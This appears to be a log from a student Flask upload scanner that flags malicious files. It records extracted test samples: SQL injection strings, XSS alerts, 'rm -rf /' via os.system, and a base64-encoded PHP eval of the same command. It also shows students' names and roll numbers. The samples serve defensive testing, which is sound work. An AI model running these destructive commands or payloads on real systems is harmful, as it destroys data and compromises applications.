2025-02-23 16:00:32,778 - 127.0.0.1 - - [23/Feb/2025 16:00:32] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-23 16:00:32,781 - 127.0.0.1 - - [23/Feb/2025 16:00:32] "GET / HTTP/1.1" 200 -
2025-02-23 16:01:13,830 - Extracted content from uploads/malicious.pptx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
<script>alert('XSS');</script>
eval('some malicious code');
2025-02-23 16:01:13,830 - Malicious pattern detected in uploads/malicious.pptx
2025-02-23 16:01:13,831 - 127.0.0.1 - - [23/Feb/2025 16:01:13] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-23 16:01:13,834 - 127.0.0.1 - - [23/Feb/2025 16:01:13] "GET / HTTP/1.1" 200 -
2025-02-23 16:01:32,604 - Extracted content from uploads/test/test/2 (copy).yaml: <script>alert('Hacked!');</script>

2025-02-23 16:01:32,604 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-23 16:01:32,604 - Malicious pattern detected in uploads/test/test/3.py
2025-02-23 16:01:32,604 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-23 16:01:32,604 - Malicious pattern detected in uploads/test/test/4.php
2025-02-23 16:01:32,604 - Extracted content from uploads/test/test/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-23 16:01:32,604 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-23 16:01:32,604 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-23 16:01:32,605 - Extracted content from uploads/test/test/45.xml: import os
os.system("rm -rf /")  # Dangerous command

2025-02-23 16:01:32,605 - Malicious pattern detected in uploads/test/test/45.xml
2025-02-23 16:01:32,605 - Extracted content from uploads/test/test/6.js: import os
os.system("rm -rf /")  # Dangerous command

2025-02-23 16:01:32,605 - Malicious pattern detected in uploads/test/test/6.js
2025-02-23 16:01:32,605 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-23 16:01:32,605 - Extracted content from temp_extracted/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-23 16:01:32,605 - Malicious pattern detected in temp_extracted/1/1.sql
2025-02-23 16:01:32,605 - Malicious file detected in ZIP: temp_extracted/1/1.sql
2025-02-23 16:01:32,605 - Extracted content from uploads/test/test/2 (copy).yaml: <script>alert('Hacked!');</script>

2025-02-23 16:01:32,608 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-23 16:01:32,609 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-23 16:01:32,612 - 127.0.0.1 - - [23/Feb/2025 16:01:32] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-23 16:01:32,617 - 127.0.0.1 - - [23/Feb/2025 16:01:32] "GET / HTTP/1.1" 200 -
2025-02-23 16:02:23,798 - 127.0.0.1 - - [23/Feb/2025 16:02:23] "GET / HTTP/1.1" 200 -
2025-02-23 16:05:56,898 - Extracted content from temp_extracted/roooeo/roooeo.txt: username=admin' OR '1'='1'; -- 
password=secret




exec('rm -rf /');  # Dangerous command to delete files
system('ls -la');  # Command to list files



<?php
$payload = "exec('malicious_code_here')";
eval($payload);  // This executes the code contained in $payload
?>



<?php
$payload = "exec('malicious_code_here')";
eval($payload);  // This executes the code contained in $payload
?>



import requests

url = "http://example.com/login"
usernames = ["admin", "user"]
passwords = ["password", "123
2025-02-23 16:05:56,899 - Malicious pattern detected in temp_extracted/roooeo/roooeo.txt
2025-02-23 16:05:56,899 - Malicious file detected in ZIP: temp_extracted/roooeo/roooeo.txt
2025-02-23 16:05:56,900 - 127.0.0.1 - - [23/Feb/2025 16:05:56] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-23 16:05:56,904 - 127.0.0.1 - - [23/Feb/2025 16:05:56] "GET / HTTP/1.1" 200 -
2025-02-23 16:06:06,880 - Extracted content from temp_extracted/flask_file_upload_3/flask_file_upload/create_malicious_xlsx.py: from openpyxl import Workbook

def create_malicious_xlsx(filename):
    # Create a new Workbook
    wb = Workbook()
    
    # Add a sheet
    ws = wb.active
    ws.title = "Malicious Data"
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "eval('some malicious code');"
    ]
    
    for index, line in enumerate(suspicious_content, start=1):
        ws[f'A{index}'] = line
    
    # Add susp
2025-02-23 16:06:06,881 - Malicious pattern detected in temp_extracted/flask_file_upload_3/flask_file_upload/create_malicious_xlsx.py
2025-02-23 16:06:06,881 - Malicious file detected in ZIP: temp_extracted/flask_file_upload_3/flask_file_upload/create_malicious_xlsx.py
2025-02-23 16:06:06,889 - 127.0.0.1 - - [23/Feb/2025 16:06:06] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-23 16:06:06,893 - 127.0.0.1 - - [23/Feb/2025 16:06:06] "GET / HTTP/1.1" 200 -
2025-02-23 16:10:31,506 - 127.0.0.1 - - [23/Feb/2025 16:10:31] "GET / HTTP/1.1" 200 -
2025-02-23 16:15:46,040 - Extracted content from temp_extracted/detect-atack_6/detect-atack/flask_file_upload/create_malicious_xlsx.py: from openpyxl import Workbook

def create_malicious_xlsx(filename):
    # Create a new Workbook
    wb = Workbook()
    
    # Add a sheet
    ws = wb.active
    ws.title = "Malicious Data"
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "eval('some malicious code');"
    ]
    
    for index, line in enumerate(suspicious_content, start=1):
        ws[f'A{index}'] = line
    
    # Add susp
2025-02-23 16:15:46,040 - Malicious pattern detected in temp_extracted/detect-atack_6/detect-atack/flask_file_upload/create_malicious_xlsx.py
2025-02-23 16:15:46,040 - Malicious file detected in ZIP: temp_extracted/detect-atack_6/detect-atack/flask_file_upload/create_malicious_xlsx.py
2025-02-23 16:15:46,041 - 127.0.0.1 - - [23/Feb/2025 16:15:46] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-23 16:15:46,044 - 127.0.0.1 - - [23/Feb/2025 16:15:46] "GET / HTTP/1.1" 200 -
2025-02-23 18:23:16,095 - Extracted content from uploads/BATCH_NO_6_FINAL (1).pptx: JCS1832 PROJECT WORK PHASE - IIPERCEIVING AND PREVENTING ATTACKS IN CLOUD ENVIRONMENTVIVA VOCEDate: 30-01-2025 BATCH NO: 06
PRESENTED BY
SADHANA N(130721104072)
PRIYA DHARSHINI A(130721104061)
RAJESHWARI B(130721104067)
SUPERVISED  BY 
Mrs. P. MAHALAKSHMI
ASSISTANT PROFESSOR(CSE)
JERUSALEM COLLEGE OF ENGINEERING, CHENNAI-100

         DEPARTMENT OF COMPUTER SCIENCE AND ENGINEERING
1
Department of CSE Jerusalem College of Engineering
30-Jan-25
OBJECTIVE
2
Department of CSE
Jerusalem College o
2025-02-23 18:23:16,129 - Embedded object detected in uploads/BATCH_NO_6_FINAL (1).pptx
2025-02-23 18:23:16,129 - Moved BATCH_NO_6_FINAL (1).pptx to trash due to suspicious content.
2025-02-23 18:23:16,132 - Extracted content from uploads/test/test/2 (copy).yaml: <script>alert('Hacked!');</script>

2025-02-23 18:23:16,133 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-23 18:23:16,134 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-23 18:23:16,137 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-23 18:23:16,137 - [33mPress CTRL+C to quit[0m
2025-02-23 18:24:39,606 - Extracted content from uploads/test/test/2 (copy).yaml: <script>alert('Hacked!');</script>

2025-02-23 18:24:39,608 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-23 18:24:39,609 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-23 18:24:39,612 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-23 18:24:39,612 - [33mPress CTRL+C to quit[0m
2025-02-23 18:24:47,993 - 127.0.0.1 - - [23/Feb/2025 18:24:47] "GET / HTTP/1.1" 200 -
2025-02-23 18:24:48,590 - 127.0.0.1 - - [23/Feb/2025 18:24:48] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
2025-02-23 18:25:02,061 - 127.0.0.1 - - [23/Feb/2025 18:25:02] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-23 18:25:02,066 - 127.0.0.1 - - [23/Feb/2025 18:25:02] "GET / HTTP/1.1" 200 -
2025-02-23 18:25:09,878 - Extracted content from uploads/malicious.xlsx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
eval('some malicious code');
2025-02-23 18:25:09,878 - Malicious pattern detected in uploads/malicious.xlsx
2025-02-23 18:25:09,879 - 127.0.0.1 - - [23/Feb/2025 18:25:09] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-23 18:25:09,883 - 127.0.0.1 - - [23/Feb/2025 18:25:09] "GET / HTTP/1.1" 200 -
2025-02-23 18:25:16,194 - Extracted content from uploads/secret.txt: import os
os.system("rm -rf /")  # Dangerous command

2025-02-23 18:25:16,194 - Malicious pattern detected in uploads/secret.txt
2025-02-23 18:25:16,195 - 127.0.0.1 - - [23/Feb/2025 18:25:16] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-23 18:25:16,199 - 127.0.0.1 - - [23/Feb/2025 18:25:16] "GET / HTTP/1.1" 200 -
2025-02-23 18:25:22,093 - Extracted content from temp_extracted/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-23 18:25:22,093 - Malicious pattern detected in temp_extracted/1/1.sql
2025-02-23 18:25:22,093 - Malicious file detected in ZIP: temp_extracted/1/1.sql
2025-02-23 18:25:22,094 - 127.0.0.1 - - [23/Feb/2025 18:25:22] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-23 18:25:22,099 - 127.0.0.1 - - [23/Feb/2025 18:25:22] "GET / HTTP/1.1" 200 -
2025-02-23 18:25:27,627 - Extracted content from uploads/5.txt: password_list.txt
admin123
qwerty

2025-02-23 18:25:27,631 - 127.0.0.1 - - [23/Feb/2025 18:25:27] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-23 18:25:27,635 - 127.0.0.1 - - [23/Feb/2025 18:25:27] "GET / HTTP/1.1" 200 -
2025-02-23 18:27:10,082 - Extracted content from uploads/5.txt: password_list.txt
admin123
qwerty

2025-02-23 18:27:10,084 - Extracted content from uploads/test/test/2 (copy).yaml: <script>alert('Hacked!');</script>

2025-02-23 18:27:10,085 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-23 18:27:10,086 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-23 18:27:10,089 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-23 18:27:10,089 - [33mPress CTRL+C to quit[0m
2025-02-23 18:27:13,754 - 127.0.0.1 - - [23/Feb/2025 18:27:13] "GET / HTTP/1.1" 200 -
2025-02-23 18:27:18,769 - Extracted content from uploads/5.txt: password_list.txt
admin123
qwerty

2025-02-23 18:27:18,773 - 127.0.0.1 - - [23/Feb/2025 18:27:18] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-23 18:27:18,778 - 127.0.0.1 - - [23/Feb/2025 18:27:18] "GET / HTTP/1.1" 200 -
2025-02-23 18:27:25,230 - Extracted content from temp_extracted/flask_file_upload_4/flask_file_upload/create_malicious_xlsx.py: from openpyxl import Workbook

def create_malicious_xlsx(filename):
    # Create a new Workbook
    wb = Workbook()
    
    # Add a sheet
    ws = wb.active
    ws.title = "Malicious Data"
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "eval('some malicious code');"
    ]
    
    for index, line in enumerate(suspicious_content, start=1):
        ws[f'A{index}'] = line
    
    # Add susp
2025-02-23 18:27:25,231 - Malicious pattern detected in temp_extracted/flask_file_upload_4/flask_file_upload/create_malicious_xlsx.py
2025-02-23 18:27:25,231 - Malicious file detected in ZIP: temp_extracted/flask_file_upload_4/flask_file_upload/create_malicious_xlsx.py
2025-02-23 18:27:25,232 - 127.0.0.1 - - [23/Feb/2025 18:27:25] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-23 18:27:25,236 - 127.0.0.1 - - [23/Feb/2025 18:27:25] "GET / HTTP/1.1" 200 -
2025-02-23 18:27:42,899 - Extracted content from uploads/5.txt: password_list.txt
admin123
qwerty

2025-02-23 18:27:42,901 - Extracted content from uploads/test/test/2 (copy).yaml: <script>alert('Hacked!');</script>

2025-02-23 18:27:42,902 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-23 18:27:42,903 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-23 18:27:42,906 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-23 18:27:42,906 - [33mPress CTRL+C to quit[0m
2025-02-23 18:27:49,587 - 127.0.0.1 - - [23/Feb/2025 18:27:49] "GET / HTTP/1.1" 200 -
2025-02-23 18:27:53,640 - Extracted content from uploads/5.txt: password_list.txt
admin123
qwerty

2025-02-23 18:27:53,645 - 127.0.0.1 - - [23/Feb/2025 18:27:53] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-23 18:27:53,650 - 127.0.0.1 - - [23/Feb/2025 18:27:53] "GET / HTTP/1.1" 200 -
2025-02-23 18:33:43,403 - Extracted content from uploads/5.txt: password_list.txt
admin123
qwerty

2025-02-23 18:33:43,405 - Extracted content from uploads/test/test/2 (copy).yaml: <script>alert('Hacked!');</script>

2025-02-23 18:33:43,406 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-23 18:33:43,407 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-23 18:33:43,409 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-23 18:33:43,409 - [33mPress CTRL+C to quit[0m
2025-02-23 18:33:47,128 - 127.0.0.1 - - [23/Feb/2025 18:33:47] "GET / HTTP/1.1" 200 -
2025-02-23 18:40:18,242 - Extracted content from uploads/5.txt: password_list.txt
admin123
qwerty

2025-02-23 18:40:18,245 - Extracted content from uploads/test/test/2 (copy).yaml: <script>alert('Hacked!');</script>

2025-02-23 18:40:18,246 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-23 18:40:18,248 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-23 18:40:18,252 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-23 18:40:18,252 - [33mPress CTRL+C to quit[0m
2025-02-23 18:40:28,294 - 127.0.0.1 - - [23/Feb/2025 18:40:28] "GET / HTTP/1.1" 200 -
2025-02-23 18:42:05,693 - Extracted content from uploads/5.txt: password_list.txt
admin123
qwerty

2025-02-23 18:42:05,696 - 127.0.0.1 - - [23/Feb/2025 18:42:05] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-23 18:42:05,699 - 127.0.0.1 - - [23/Feb/2025 18:42:05] "GET / HTTP/1.1" 200 -
2025-02-23 18:42:26,815 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-23 18:42:26,816 - Extracted content from uploads/new_test/new_test/test_hidden_xml.xml: <?xml version="1.0" encoding="UTF-8"?>
<root>
    <data>
        <item>Normal content</item>
        <item>SELECT * FROM users WHERE username = 'admin'</item> <!-- SQL Injection -->
    </data>
</root>
2025-02-23 18:42:26,816 - Malicious pattern detected in uploads/new_test/new_test/test_hidden_xml.xml
2025-02-23 18:42:26,831 - Extracted content from uploads/new_test/new_test/test_doc_hidden.docx: SELECT * FROM users WHERE username = 'admin' AND password = 'password'
2025-02-23 18:42:26,832 - Malicious pattern detected in uploads/new_test/new_test/test_doc_hidden.docx
2025-02-23 18:42:26,838 - Extracted content from uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-23 18:42:26,838 - Malicious pattern detected in uploads/new_test/new_test/test_malicious.pptx
2025-02-23 18:42:26,838 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-23 18:42:26,838 - Malicious pattern detected in uploads/new_test/new_test/text_hidden_yaml.yaml
2025-02-23 18:42:26,838 - Extracted content from uploads/new_test/new_test/test_sql_injection.txt: echo "SELECT * FROM users WHERE username = 'admin' AND password = 'password'" > test_sql_injection.txt
2025-02-23 18:42:26,838 - Malicious pattern detected in uploads/new_test/new_test/test_sql_injection.txt
2025-02-23 18:42:26,838 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-23 18:42:26,841 - Extracted content from uploads/new_test/new_test/malicious.xlsx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
eval('some malicious code');
2025-02-23 18:42:26,841 - Malicious pattern detected in uploads/new_test/new_test/malicious.xlsx
2025-02-23 18:42:26,845 - Extracted content from uploads/new_test/new_test/malicious.pptx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
<script>alert('XSS');</script>
eval('some malicious code');
2025-02-23 18:42:26,845 - Malicious pattern detected in uploads/new_test/new_test/malicious.pptx
2025-02-23 18:42:26,845 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-23 18:42:26,847 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-23 18:42:26,849 - 127.0.0.1 - - [23/Feb/2025 18:42:26] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-23 18:42:26,852 - 127.0.0.1 - - [23/Feb/2025 18:42:26] "GET / HTTP/1.1" 200 -
2025-02-23 18:44:34,848 - Extracted content from uploads/5.txt: password_list.txt
admin123
qwerty

2025-02-23 18:44:34,850 - Extracted content from uploads/test/test/2 (copy).yaml: <script>alert('Hacked!');</script>

2025-02-23 18:44:34,852 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-23 18:44:34,853 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-23 18:44:34,854 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-23 18:44:34,855 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-23 18:44:34,858 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-23 18:44:34,858 - [33mPress CTRL+C to quit[0m
2025-02-23 18:44:40,616 - 127.0.0.1 - - [23/Feb/2025 18:44:40] "GET / HTTP/1.1" 200 -
2025-02-23 18:44:47,640 - Extracted content from uploads/5.txt: password_list.txt
admin123
qwerty

2025-02-23 18:44:47,644 - 127.0.0.1 - - [23/Feb/2025 18:44:47] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-23 18:44:47,649 - 127.0.0.1 - - [23/Feb/2025 18:44:47] "GET / HTTP/1.1" 200 -
2025-02-23 18:44:56,687 - Extracted content from temp_extracted/roooeo/roooeo.txt: username=admin' OR '1'='1'; -- 
password=secret




exec('rm -rf /');  # Dangerous command to delete files
system('ls -la');  # Command to list files



<?php
$payload = "exec('malicious_code_here')";
eval($payload);  // This executes the code contained in $payload
?>



<?php
$payload = "exec('malicious_code_here')";
eval($payload);  // This executes the code contained in $payload
?>



import requests

url = "http://example.com/login"
usernames = ["admin", "user"]
passwords = ["password", "123
2025-02-23 18:44:56,687 - Malicious pattern detected in temp_extracted/roooeo/roooeo.txt
2025-02-23 18:44:56,687 - Malicious file detected in ZIP: temp_extracted/roooeo/roooeo.txt
2025-02-23 18:44:56,688 - 127.0.0.1 - - [23/Feb/2025 18:44:56] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-23 18:44:56,693 - 127.0.0.1 - - [23/Feb/2025 18:44:56] "GET / HTTP/1.1" 200 -
2025-02-23 18:45:01,186 - 127.0.0.1 - - [23/Feb/2025 18:45:01] "[32mGET /delete/1 HTTP/1.1[0m" 302 -
2025-02-23 18:45:01,192 - 127.0.0.1 - - [23/Feb/2025 18:45:01] "GET / HTTP/1.1" 200 -
2025-02-23 18:45:02,702 - 127.0.0.1 - - [23/Feb/2025 18:45:02] "[32mGET /delete/2 HTTP/1.1[0m" 302 -
2025-02-23 18:45:02,707 - 127.0.0.1 - - [23/Feb/2025 18:45:02] "GET / HTTP/1.1" 200 -
2025-02-23 18:45:03,629 - 127.0.0.1 - - [23/Feb/2025 18:45:03] "[32mGET /delete/3 HTTP/1.1[0m" 302 -
2025-02-23 18:45:03,633 - 127.0.0.1 - - [23/Feb/2025 18:45:03] "GET / HTTP/1.1" 200 -
2025-02-23 18:45:04,544 - 127.0.0.1 - - [23/Feb/2025 18:45:04] "[32mGET /delete/5 HTTP/1.1[0m" 302 -
2025-02-23 18:45:04,548 - 127.0.0.1 - - [23/Feb/2025 18:45:04] "GET / HTTP/1.1" 200 -
2025-02-23 18:45:15,157 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-23 18:45:15,158 - Extracted content from uploads/new_test/new_test/test_hidden_xml.xml: <?xml version="1.0" encoding="UTF-8"?>
<root>
    <data>
        <item>Normal content</item>
        <item>SELECT * FROM users WHERE username = 'admin'</item> <!-- SQL Injection -->
    </data>
</root>
2025-02-23 18:45:15,158 - Malicious pattern detected in uploads/new_test/new_test/test_hidden_xml.xml
2025-02-23 18:45:15,172 - Extracted content from uploads/new_test/new_test/test_doc_hidden.docx: SELECT * FROM users WHERE username = 'admin' AND password = 'password'
2025-02-23 18:45:15,172 - Malicious pattern detected in uploads/new_test/new_test/test_doc_hidden.docx
2025-02-23 18:45:15,177 - Extracted content from uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-23 18:45:15,177 - Malicious pattern detected in uploads/new_test/new_test/test_malicious.pptx
2025-02-23 18:45:15,177 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-23 18:45:15,177 - Malicious pattern detected in uploads/new_test/new_test/text_hidden_yaml.yaml
2025-02-23 18:45:15,177 - Extracted content from uploads/new_test/new_test/test_sql_injection.txt: echo "SELECT * FROM users WHERE username = 'admin' AND password = 'password'" > test_sql_injection.txt
2025-02-23 18:45:15,177 - Malicious pattern detected in uploads/new_test/new_test/test_sql_injection.txt
2025-02-23 18:45:15,177 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-23 18:45:15,181 - Extracted content from uploads/new_test/new_test/malicious.xlsx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
eval('some malicious code');
2025-02-23 18:45:15,181 - Malicious pattern detected in uploads/new_test/new_test/malicious.xlsx
2025-02-23 18:45:15,185 - Extracted content from uploads/new_test/new_test/malicious.pptx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
<script>alert('XSS');</script>
eval('some malicious code');
2025-02-23 18:45:15,185 - Malicious pattern detected in uploads/new_test/new_test/malicious.pptx
2025-02-23 18:45:15,185 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-23 18:45:15,187 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-23 18:45:15,188 - 127.0.0.1 - - [23/Feb/2025 18:45:15] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-23 18:45:15,191 - 127.0.0.1 - - [23/Feb/2025 18:45:15] "GET / HTTP/1.1" 200 -
2025-02-23 18:45:56,846 - 127.0.0.1 - - [23/Feb/2025 18:45:56] "GET / HTTP/1.1" 200 -
2025-02-23 18:45:57,054 - 127.0.0.1 - - [23/Feb/2025 18:45:57] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
2025-02-23 18:46:16,002 - 127.0.0.1 - - [23/Feb/2025 18:46:16] "GET / HTTP/1.1" 200 -
2025-02-24 10:12:36,358 - Extracted content from uploads/test/test/2 (copy).yaml: <script>alert('Hacked!');</script>

2025-02-24 10:12:36,361 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-24 10:12:36,363 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-24 10:12:36,364 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-24 10:12:36,366 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-24 10:12:36,369 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-24 10:12:36,369 - [33mPress CTRL+C to quit[0m
2025-02-24 10:12:48,408 - 127.0.0.1 - - [24/Feb/2025 10:12:48] "GET / HTTP/1.1" 200 -
2025-02-24 10:12:48,445 - 127.0.0.1 - - [24/Feb/2025 10:12:48] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
2025-02-24 10:12:50,627 - 127.0.0.1 - - [24/Feb/2025 10:12:50] "GET / HTTP/1.1" 200 -
2025-02-24 10:12:50,806 - 127.0.0.1 - - [24/Feb/2025 10:12:50] "GET / HTTP/1.1" 200 -
2025-02-24 10:12:51,375 - 127.0.0.1 - - [24/Feb/2025 10:12:51] "GET / HTTP/1.1" 200 -
2025-02-24 10:12:51,555 - 127.0.0.1 - - [24/Feb/2025 10:12:51] "GET / HTTP/1.1" 200 -
2025-02-24 10:13:42,919 - 127.0.0.1 - - [24/Feb/2025 10:13:42] "GET / HTTP/1.1" 200 -
2025-02-24 10:14:43,346 - Extracted content from uploads/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-24 10:14:43,346 - Malicious pattern detected in uploads/1.sql
2025-02-24 10:14:43,346 - 127.0.0.1 - - [24/Feb/2025 10:14:43] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-24 10:14:43,350 - 127.0.0.1 - - [24/Feb/2025 10:14:43] "GET / HTTP/1.1" 200 -
2025-02-24 10:14:52,853 - Extracted content from uploads/B_6_R_2.pptx: JCS1832 PROJECT WORK PHASE - IIPERCEIVING AND PREVENTING ATTACKS IN CLOUD ENVIRONMENTVIVA VOCEDate: 24-02-2025 BATCH NO: 06
PRESENTED BY
PRIYA DHARSHINI A(130721104061)
RAJESHWARI B(130721104067)
SADHANA N(130721104072)
SUPERVISED  BY 
Mrs. P. MAHALAKSHMI
ASSISTANT PROFESSOR(CSE)
JERUSALEM COLLEGE OF ENGINEERING, CHENNAI-100

         DEPARTMENT OF COMPUTER SCIENCE AND ENGINEERING
<number>
Department of CSE Jerusalem College of Engineering
Feb 23, 2025
OBJECTIVE
<number>
Department of CSE
Je
2025-02-24 10:14:52,858 - 127.0.0.1 - - [24/Feb/2025 10:14:52] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-24 10:14:52,860 - 127.0.0.1 - - [24/Feb/2025 10:14:52] "GET / HTTP/1.1" 200 -
2025-02-24 10:15:09,394 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-24 10:15:09,394 - Malicious pattern detected in uploads/test/test/4.php
2025-02-24 10:15:09,395 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-24 10:15:09,395 - Extracted content from uploads/test/test/2 (copy).yaml: <script>alert('Hacked!');</script>

2025-02-24 10:15:09,395 - Extracted content from uploads/test/test/45.xml: import os
os.system("rm -rf /")  # Dangerous command

2025-02-24 10:15:09,395 - Malicious pattern detected in uploads/test/test/45.xml
2025-02-24 10:15:09,395 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-24 10:15:09,395 - Malicious pattern detected in uploads/test/test/3.py
2025-02-24 10:15:09,395 - Extracted content from uploads/test/test/6.js: import os
os.system("rm -rf /")  # Dangerous command

2025-02-24 10:15:09,395 - Malicious pattern detected in uploads/test/test/6.js
2025-02-24 10:15:09,395 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-24 10:15:09,395 - Extracted content from uploads/test/test/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-24 10:15:09,395 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-24 10:15:09,397 - Extracted content from temp_extracted/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

